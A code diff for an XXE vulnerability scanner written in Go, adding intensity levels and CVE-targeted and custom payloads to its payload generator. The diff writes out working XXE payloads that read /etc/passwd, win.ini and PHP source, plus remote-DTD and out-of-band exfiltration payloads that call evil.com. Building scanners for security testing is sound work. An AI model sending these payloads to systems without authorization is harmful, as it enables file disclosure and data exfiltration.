@@ -44,6 +44,8 @@ type XXEScanner struct {
 	PageCountMu sync.Mutex
 	MaxDepth    int
 	Payloads    []string
+	Intensity   int
+	TargetedCVEs []string
 	Throttle    time.Duration
 }
 
@@ -53,8 +55,7 @@ type xxeCrawlJob struct {
 	Depth int
 }
 
-// NewXXEScanner creates a new instance of the XXE scanner
-func NewXXEScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*XXEScanner, error) {
+func NewXXEScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, targetedCVEs []string, customPayloads []string) (*XXEScanner, error) {
 	parsed, err := url.Parse(start)
 	if err != nil {
 		return nil, err
@@ -63,17 +64,21 @@ func NewXXEScanner(start string, workers, maxPages, maxDepth int, throttle time.
 		Timeout: 20 * time.Second,
 	}
 
+	payloads := generateXXEPayloads(intensity, targetedCVEs, customPayloads)
+
 	s := &XXEScanner{
-		StartURL: parsed,
-		Client:   client,
-		Visited:  make(map[string]bool),
-		Queue:    make(chan xxeCrawlJob, 1000),
-		Findings: []FindingXXE{},
-		Workers:  workers,
-		MaxPages: maxPages,
-		MaxDepth: maxDepth,
-		Throttle: throttle,
-		Payloads: generateXXEPayloads(),
+		StartURL:     parsed,
+		Client:       client,
+		Visited:      make(map[string]bool),
+		Queue:        make(chan xxeCrawlJob, 1000),
+		Findings:     []FindingXXE{},
+		Workers:      workers,
+		MaxPages:     maxPages,
+		MaxDepth:     maxDepth,
+		Throttle:     throttle,
+		Payloads:     payloads,
+		Intensity:    intensity,
+		TargetedCVEs: targetedCVEs,
 	}
 	return s, nil
 }
@@ -276,19 +281,41 @@ func (s *XXEScanner) detectXXE(body string) (string, bool) {
 	return "", false
 }
 
-func generateXXEPayloads() []string {
-	return []string{
-		// Basic /etc/passwd
-		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
-		// Windows win.ini
-		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>`,
-		// PHP Filter
-		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>`,
-		// Parameter Entity
-		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root></root>`,
-		// SOAP
-		`<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><foo><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root></foo></soap:Body></soap:Envelope>`,
+func generateXXEPayloads(intensity int, targetedCVEs []string, customPayloads []string) []string {
+	var payloads []string
+
+	// CVE-specific payloads
+	for _, id := range targetedCVEs {
+		if cve, ok := GetCVEDatabase()[id]; ok && cve.Type == ScannerXXE {
+			payloads = append(payloads, cve.Payloads...)
+		}
 	}
+
+	base := []string{
+		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
+		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>`,
+	}
+
+	if intensity > 2 {
+		base = append(base, []string{
+			`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>`,
+			`<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><foo><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root></foo></soap:Body></soap:Envelope>`,
+		}...)
+	}
+
+	if intensity > 3 {
+		base = append(base, []string{
+			`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root></root>`,
+			`<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/out-of-band.dtd">%dtd;%all;]><data>&send;</data>`,
+		}...)
+	}
+
+	payloads = append(payloads, base...)
+	if len(customPayloads) > 0 {
+		payloads = append(payloads, customPayloads...)
+	}
+
+	return payloads
 }
 
 func (s *XXEScanner) markVisited(u string) bool {
